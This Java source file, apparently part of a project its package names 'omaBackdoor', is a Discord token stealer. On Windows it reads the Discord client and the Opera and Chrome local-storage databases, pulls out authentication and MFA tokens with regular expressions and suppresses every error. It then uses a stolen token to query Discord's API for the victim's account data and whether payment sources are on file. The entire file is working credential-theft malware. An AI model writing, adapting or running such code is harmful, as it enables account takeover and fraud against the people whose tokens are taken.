package me.oma.omaBackdoor.payloads;

import com.google.gson.Gson;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.google.gson.reflect.TypeToken;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Discord
{
    public static Gson gson = new Gson();

    public String token = getDiscordToken();

    public String getDiscordToken()
    {
        String os = System.getProperty("os.name");
        ArrayList<String> furryHentai = new ArrayList();

        if (os.contains("Windows"))
        {
            try
            {
                List<String> paths = new ArrayList();
                paths.add(System.getProperty("user.home") + "/AppData/Roaming/discord/Local Storage/leveldb/");
                paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordptb/Local Storage/leveldb/");
                paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordcanary/Local Storage/leveldb/");
                paths.add(System.getProperty("user.home") + "/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb");
                paths.add(System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb");
                Iterator var4 = paths.iterator();

                label68:
                while (true)
                {
                    String path;
                    String[] pathnames;

                    do {
                        if (!var4.hasNext())
                        {
                            break label68;
                        }

                        path = (String) var4.next();
                        File f = new File(path);
                        pathnames = f.list();

                    }
                    while (pathnames == null);

                    String[] var8 = pathnames;
                    int var9 = pathnames.length;

                    for (int var10 = 0; var10 < var9; ++var10) {
                        String pathname = var8[var10];

                        try
                        {
                            FileInputStream fstream = new FileInputStream(path + pathname);
                            DataInputStream in = new DataInputStream(fstream);
                            BufferedReader br = new BufferedReader(new InputStreamReader(in));

                            String strLine;
                            while ((strLine = br.readLine()) != null)
                            {
                                Pattern p = Pattern.compile("[\\w]{24}\\.[\\w]{6}\\.[\\w]{27}");
                                Matcher m = p.matcher(strLine);
                                Pattern mfa = Pattern.compile("mfa\\.[\\w-]{84}");
                                Matcher mfam = mfa.matcher(strLine);

                                while (m.find())
                                {
                                    furryHentai.add(m.group());
                                }

                                while (mfam.find())
                                {
                                    furryHentai.add(m.group());
                                }
                            }
                        }
                        catch (Exception var20)
                        {

                        }
                    }
                }
            }
            catch (Exception var21)
            {
            }

            Iterator var22 = furryHentai.iterator();

            while (var22.hasNext())
            {
                String str = (String) var22.next();
                return str;
            }
        }
        return "Fail";
    }

    public boolean hasPaymentMethods(String token)
    {
        return getContentFromURL("https://discordapp.com/api/v6/users/@me/billing/payment-sources", token).length() > 4;
    }

    public String getUserData()
    {
        return getContentFromURL("https://discordapp.com/api/v6/users/@me", token);
    }

    public String getContentFromURL(String link, String auth)
    {
        try
        {
            URL url = new URL(link);
            HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
            httpURLConnection.setRequestMethod("GET");
            Map<String, Object> json = gson.fromJson(getHeaders(auth), new TypeToken<Map<String, Object>>() {}.getType());
            json.forEach((key, value) -> httpURLConnection.addRequestProperty(key, (String) value));
            httpURLConnection.connect();
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
            StringBuilder stringBuilder = new StringBuilder();
            String line;
            while ((line = bufferedReader.readLine()) != null) stringBuilder.append(line).append("\n");
            bufferedReader.close();
            return stringBuilder.toString();
        }
        catch (Exception ignored)
        {
            return "";
        }
    }

    public JsonObject getHeaders(String token)
    {
        JsonObject object = new JsonObject();
        object.addProperty("Content-Type", "application/json");
        object.addProperty("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11");
        if (token != null) object.addProperty("Authorization", token);
        return object;
    }
}
